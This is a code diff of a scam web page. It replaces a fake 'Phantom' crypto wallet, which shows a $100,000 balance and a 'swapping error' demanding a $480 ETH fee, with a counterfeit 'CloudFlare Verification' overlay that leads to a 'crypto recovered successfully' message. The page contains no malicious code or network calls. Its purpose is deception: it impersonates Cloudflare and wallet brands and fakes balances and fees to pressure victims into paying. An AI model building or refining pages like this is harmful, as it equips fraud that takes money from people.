@@ -1,428 +1,125 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom profits</title>
-    <style>
-        :root {
-            --purple-dark: #25134d;
-            --purple-mid: #6b3fc9;
-            --purple-light: #b98aff;
-            --purple-accent: #6e4aff;
-            --white: #fff;
-            --gray-bg: #1e1733;
-            --gray-light: #ded8ff;
-            --shadow: 0 8px 32px 0 rgba(34,19,77,0.18);
-        }
-        body {
-            font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
-            background: radial-gradient(ellipse at 80% 0%, var(--purple-light) 0%, var(--purple-accent) 40%, var(--purple-dark) 100%);
-            margin: 0;
-            min-height: 100vh;
-            color: var(--gray-light);
-            letter-spacing: 0.01em;
-        }
-        .wallet-container {
-            max-width: 430px;
-            margin: 60px auto 36px auto;
-            padding: 32px 20px 24px 20px;
-            background: rgba(32, 22, 58, 0.99);
-            border-radius: 22px;
-            box-shadow: var(--shadow);
-            position: relative;
-            border: 1.5px solid var(--purple-mid);
-        }
-        .logo-circle-holder {
-            width: 74px;
-            height: 74px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--purple-accent) 55%, var(--purple-light) 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 16px rgba(110,74,255,0.17);
-            position: absolute;
-            left: 50%;
-            top: -37px;
-            transform: translateX(-50%);
-            border: 4px solid var(--gray-bg);
-        }
-        .logo-circle-holder img {
-            width: 38px;
-            height: 38px;
-        }
-        .wallet-title {
-            text-align: center;
-            margin-top: 46px;
-            font-size: 1.45rem;
-            font-weight: 700;
-            color: var(--purple-light);
-            letter-spacing: 0.6px;
-            margin-bottom: 18px;
-        }
-        .balance-label {
-            color: #b2b0c7;
-            font-size: 1rem;
-            margin-bottom: 3px;
-            text-align: center;
-            font-weight: 500;
-        }
-        .balance {
-            font-size: 2.4rem;
-            font-weight: 800;
-            color: var(--white);
-            margin-bottom: 10px;
-            text-align: center;
-            letter-spacing: 1.5px;
-            text-shadow: 0 2px 12px #6b3fc93a;
-        }
-        .wallet-actions {
-            display: flex;
-            gap: 18px;
-            margin-bottom: 24px;
-            justify-content: center;
-        }
-        .wallet-actions button {
-            flex: 1 1 0;
-            background: linear-gradient(90deg, var(--purple-accent), var(--purple-light) 100%);
-            color: #fff;
-            border: none;
-            border-radius: 13px;
-            padding: 13px 0;
-            font-size: 1.05rem;
-            font-weight: 700;
-            box-shadow: 0 3px 8px rgba(110,74,255,0.10);
-            transition: background 0.19s, transform 0.09s;
-            cursor: pointer;
-            min-width: 108px;
-        }
-        .wallet-actions button:hover {
-            background: linear-gradient(90deg, #5636b6 50%, #bd8bff 100%);
-            transform: translateY(-1px) scale(1.04);
-        }
-        .tokens-section {
-            margin-top: 16px;
-            background: rgba(51,34,92,0.85);
-            border-radius: 16px;
-            padding: 18px 10px 8px 10px;
-            box-shadow: 0 2px 6px #6b3fc92a;
-        }
-        .tokens-title {
-            font-size: 1.13rem;
-            font-weight: 700;
-            color: var(--purple-light);
-            margin-bottom: 12px;
-            margin-left: 8px;
-            letter-spacing: 0.5px;
-        }
-        .token-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-        .token-list li {
-            display: flex;
-            align-items: center;
-            gap: 11px;
-            padding: 16px 5px 13px 5px;
-            border-bottom: 1px solid #2d2353;
-            cursor: pointer;
-            border-radius: 13px;
-            transition: background 0.13s, box-shadow 0.13s;
-        }
-        .token-list li:last-child {
-            border-bottom: none;
-        }
-        .token-list li:hover {
-            background: rgba(123, 90, 255, 0.09);
-            box-shadow: 0 2px 8px 0 #b98aff28;
-        }
-        .token-icon {
-            width: 34px;
-            height: 34px;
-            border-radius: 50%;
-            background: #eee;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            box-shadow: 0 1px 6px #b98aff17;
-            flex-shrink: 0;
-        }
-        .token-icon img {
-            width: 24px;
-            height: 24px;
-        }
-        .token-name {
-            font-size: 1.08rem;
-            font-weight: 600;
-            color: #f7f6fd;
-            letter-spacing: 0.05em;
-        }
-        /* Token Details Popup */
-        .token-details-bg {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(40, 15, 73, 0.18);
-            justify-content: center;
-            align-items: center;
-            z-index: 10;
-        }
-        .token-details-popup {
-            background: #241a39;
-            border-radius: 20px;
-            padding: 36px 27px 28px 27px;
-            box-shadow: 0 10px 34px rgba(110,74,255,0.17);
-            min-width: 250px;
-            max-width: 95vw;
-            text-align: center;
-            border: 1.5px solid var(--purple-accent);
-            color: var(--gray-light);
-            position: relative;
-            animation: popupIn 0.16s cubic-bezier(.4,2.2,.6,1) 1;
-        }
-        @keyframes popupIn {
-            0% {transform: scale(0.92); opacity:0;}
-            90% {transform: scale(1.05);}
-            100% {transform: scale(1); opacity:1;}
-        }
-        .token-details-popup h3 {
-            margin: 0 0 9px 0;
-            font-size: 1.32rem;
-            color: var(--purple-light);
-            text-shadow: 0 2px 6px #b98aff56;
-        }
-        .token-details-popup p {
-            margin: 0 0 18px 0;
-            color: #e9e6fe;
-            font-size: 1.13rem;
-            font-weight: 500;
-        }
-        .swap-error {
-            color: #ff2d55;
-            font-weight: bold;
-            font-size: 1.1rem;
-            margin: 11px 0 0 0;
-            letter-spacing: 0.04em;
-        }
-        .swap-needed {
-            color: #f357a8;
-            margin-top: 7px;
-            font-size: 1.08rem;
-            font-weight: 700;
-        }
-        .close-btn {
-            background: #31204e;
-            color: var(--purple-light);
-            border: none;
-            border-radius: 9px;
-            padding: 8px 21px;
-            font-size: 1.03rem;
-            cursor: pointer;
-            margin-top: 13px;
-            font-weight: 600;
-            box-shadow: 0 2px 8px #b98aff19;
-            transition: background 0.15s;
-        }
-        .close-btn:hover {
-            background: #6e4aff;
-            color: #fff;
-        }
-        /* Cloudflare Verification Overlay */
-        #cloudflare-verify-overlay {
-            position: fixed;
-            z-index: 99999;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: #fff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            transition: opacity 0.3s;
-        }
-        #cloudflare-verify-box {
-            background: #fafbfc;
-            border-radius: 12px;
-            box-shadow: 0 6px 32px rgb(60 60 60 / 10%);
-            border: 1px solid #e0e4ea;
-            padding: 2.5em 2.5em 2em 2.5em;
-            min-width: 340px;
-            max-width: 98vw;
-            text-align: center;
-            position: relative;
-        }
-        #cloudflare-logo {
-            height: 36px;
-            margin-bottom: 1.3em;
-        }
-        #cloudflare-verify-title {
-            font-size: 1.35em;
-            font-weight: 600;
-            color: #222;
-        }
-        #cloudflare-verify-desc {
-            font-size: 1em;
-            color: #444;
-            margin: 1em 0 2em 0;
-        }
-        #cloudflare-challenge-btn {
-            background: linear-gradient(90deg, #ff9100, #f80);
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            padding: 0.6em 2.5em;
-            font-size: 1.04em;
-            margin-top: 0.8em;
-            cursor: pointer;
-            font-weight: 600;
-            box-shadow: 0 2px 6px #ffa50022;
-            transition: background 0.2s;
-        }
-        #cloudflare-challenge-btn:active {
-            background: linear-gradient(90deg, #f80, #ff9100);
-        }
-        @media (max-width: 520px) {
-            .wallet-container {
-                margin: 10px;
-                padding: 13px 3px 13px 3px;
-            }
-            .wallet-title {
-                font-size: 1.08rem;
-            }
-            .logo-circle-holder {
-                width: 62px;
-                height: 62px;
-                top: -31px;
-            }
-            .logo-circle-holder img {
-                width: 30px;
-                height: 30px;
-            }
-            .token-details-popup {
-                padding: 19px 5vw 16px 5vw;
-            }
-            #cloudflare-verify-box { min-width: unset; padding: 1em 0.5em; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>CloudFlare Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%; width: 100%;
+      font-family: 'Segoe UI', 'Arial', sans-serif;
+      background: #f3f3f3;
+    }
+    #cloudflare-verify-overlay {
+      position: fixed;
+      z-index: 99999;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.3s;
+    }
+    #cloudflare-verify-box {
+      background: #fafbfc;
+      border-radius: 12px;
+      box-shadow: 0 6px 32px rgb(60 60 60 / 10%);
+      border: 1px solid #e0e4ea;
+      padding: 2.5em 2.5em 2em 2.5em;
+      min-width: 340px;
+      max-width: 98vw;
+      text-align: center;
+      position: relative;
+    }
+    #cloudflare-logo {
+      height: 36px;
+      margin-bottom: 1.3em;
+    }
+    #cloudflare-verify-title {
+      font-size: 1.35em;
+      font-weight: 600;
+      color: #222;
+    }
+    #cloudflare-verify-desc {
+      font-size: 1em;
+      color: #444;
+      margin: 1em 0 2em 0;
+    }
+    #cloudflare-challenge-btn {
+      background: linear-gradient(90deg, #ff9100, #f80);
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      padding: 0.6em 2.5em;
+      font-size: 1.04em;
+      margin-top: 0.8em;
+      cursor: pointer;
+      font-weight: 600;
+      box-shadow: 0 2px 6px #ffa50022;
+      transition: background 0.2s;
+    }
+    #cloudflare-challenge-btn:active {
+      background: linear-gradient(90deg, #f80, #ff9100);
+    }
+    #pending-message {
+      display: none;
+      font-size: 1.1em;
+      color: #333;
+      margin-top: 2em;
+      margin-bottom: 1.5em;
+      text-align: center;
+      animation: blink 1.8s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.45; }
+    }
+    @media (max-width: 500px) {
+      #cloudflare-verify-box { min-width: unset; padding: 1em 0.5em; }
+    }
+  </style>
 </head>
 <body>
-    <!-- Cloudflare-style Verification Overlay (appears every visit) -->
-    <div id="cloudflare-verify-overlay">
-        <div id="cloudflare-verify-box">
-            <svg id="cloudflare-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 115 36" fill="none">
-                <ellipse cx="22" cy="18" rx="22" ry="18" fill="#F38020"/>
-                <ellipse cx="62" cy="26" rx="26" ry="10" fill="#F7B500"/>
-                <ellipse cx="87" cy="23" rx="15" ry="7" fill="#F38020"/>
-            </svg>
-            <div id="cloudflare-verify-title">CloudFlare Verification</div>
-            <div id="cloudflare-verify-desc">
-                Please click the button below to prove you are human and continue to the site.
-            </div>
-            <button id="cloudflare-challenge-btn">Verify</button>
-        </div>
+  <!-- Cloudflare-style Verification Overlay -->
+  <div id="cloudflare-verify-overlay">
+    <div id="cloudflare-verify-box">
+      <svg id="cloudflare-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 115 36" fill="none">
+        <ellipse cx="22" cy="18" rx="22" ry="18" fill="#F38020"/>
+        <ellipse cx="62" cy="26" rx="26" ry="10" fill="#F7B500"/>
+        <ellipse cx="87" cy="23" rx="15" ry="7" fill="#F38020"/>
+      </svg>
+      <div id="cloudflare-verify-title">CloudFlare Verification</div>
+      <div id="cloudflare-verify-desc">
+        Please click the button below to prove you are human and continue to the site.
+      </div>
+      <button id="cloudflare-challenge-btn">Verify</button>
+      <div id="pending-message">Pending verification...<br>Please wait</div>
     </div>
+  </div>
 
-    <div class="wallet-container">
-        <div class="logo-circle-holder">
-            <!-- Trust Wallet logo (keep as your asset) -->
-            <img src="IMG_1823.png?v=029" alt="Trust Wallet Logo" />
-        </div>
-        <div class="wallet-title">Phantom Overview!</div>
-        <div class="balance-label">TOTAL HOLDINGS</div>
-        <div class="balance">$100,000</div>
-        <div class="wallet-actions">
-            <button>Send</button>
-            <button>Receive</button>
-        </div>
-        <div class="tokens-section">
-            <div class="tokens-title">Tokens</div>
-            <ul class="token-list">
-                <li onclick="showTokenDetails('USDT')">
-                    <div class="token-icon">
-                        <img src="IMG_1819.png?v=029" alt="USDT" />
-                    </div>
-                    <span class="token-name">USDT</span>
-                </li>
-                <li onclick="showTokenDetails('ETH')">
-                    <div class="token-icon">
-                        <img src="IMG_1818.png?v=029" alt="ETH" />
-                    </div>
-                    <span class="token-name">ETH</span>
-                </li>
-                <li onclick="showTokenDetails('BNB')">
-                    <div class="token-icon">
-                        <img src="IMG_9926.jpeg?v=029" alt="BNB" />
-                    </div>
-                    <span class="token-name">BNB</span>
-                </li>
-                <li onclick="showTokenDetails('SOL')">
-                    <div class="token-icon">
-                        <img src="IMG_0349.jpeg?v=029" alt="SOL" />
-                    </div>
-                    <span class="token-name">SOL</span>
-                </li>
-            </ul>
-        </div>
-    </div>
+  <script>
+    document.getElementById('cloudflare-challenge-btn').onclick = function() {
+      // Hide button and description, show pending message
+      document.getElementById('cloudflare-challenge-btn').style.display = 'none';
+      document.getElementById('cloudflare-verify-desc').style.display = 'none';
+      document.getElementById('pending-message').style.display = 'block';
 
-    <!-- Token Details Popup -->
-    <div class="token-details-bg" id="token-details-bg">
-        <div class="token-details-popup">
-            <h3 id="token-name"></h3>
-            <p id="token-balance"></p>
-            <div id="swap-error-area"></div>
-            <button class="close-btn" onclick="closeTokenDetails()">Close</button>
-        </div>
-    </div>
+      // Simulate verification pending for 2.5 seconds
+      setTimeout(function() {
+        document.getElementById('cloudflare-verify-overlay').style.opacity = '0';
+        setTimeout(function() {
+          document.getElementById('cloudflare-verify-overlay').style.display = 'none';
+        }, 300);
+      }, 2500);
+    };
+  </script>
 
-    <script>
-        // Cloudflare overlay logic: always shows on every visit
-        document.getElementById('cloudflare-challenge-btn').onclick = function() {
-            document.getElementById('cloudflare-verify-overlay').style.opacity = '0';
-            setTimeout(() => {
-                document.getElementById('cloudflare-verify-overlay').style.display = 'none';
-            }, 300);
-        };
-
-        function showTokenDetails(token) {
-            const tokenDetailsBg = document.getElementById('token-details-bg');
-            const tokenName = document.getElementById('token-name');
-            const tokenBalance = document.getElementById('token-balance');
-            const swapErrorArea = document.getElementById('swap-error-area');
-
-            let name = '';
-            let balance = '';
-            let errorHtml = '';
-
-            switch (token) {
-                case 'USDT':
-                    name = 'Tether (USDT)';
-                    balance = 'Balance: 0.00 USDT';
-                    break;
-                case 'ETH':
-                    name = 'Ethereum (ETH)';
-                    balance = 'Balance: 45 ETH';
-                    errorHtml = '<div class="swap-error">SWAPING ERROR ⚠️🪫</div><div class="swap-needed">$480 ETH needed</div>';
-                    break;
-                case 'BNB':
-                    name = 'Binance Coin (BNB)';
-                    balance = 'Balance: 0.00 BNB';
-                    break;
-                case 'SOL':
-                    name = 'Solana (SOL)';
-                    balance = 'Balance: 0.00 SOL';
-                    break;
-            }
-            tokenName.innerText = name;
-            tokenBalance.innerText = balance;
-            swapErrorArea.innerHTML = errorHtml;
-            tokenDetailsBg.style.display = 'flex';
-        }
-        function closeTokenDetails() {
-            document.getElementById('token-details-bg').style.display = 'none';
-        }
-    </script>
+  <!-- Your main site content below (already protected by overlay) -->
+  <div style="max-width:700px;margin:5em auto 1em auto;padding:1em 2em;background:#fff;border-radius:10px;box-shadow:0 2px 12px #0001;">
+    <h1>Welcome to ETH PRIVATE ACCOUNT</h1>
+    <p>YOUR CRYPTO HAS BEEN RECOVERED SUCCESSFULLY</p>
+    <!-- ...rest of your HTML content... -->
+  </div>
 </body>
 </html>
